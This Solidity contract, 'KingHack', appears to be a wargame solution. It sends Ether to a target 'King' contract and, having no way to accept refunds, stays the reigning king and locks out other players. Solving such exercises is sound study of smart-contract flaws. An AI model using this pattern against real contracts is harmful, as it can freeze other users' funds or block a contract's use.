pragma solidity ^0.8.1;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract KingHack is Ownable {
    
    using Address for address payable;

    function hack(address payable kingContractAddress) external payable onlyOwner {
        payable(kingContractAddress).sendValue(msg.value);
    }
}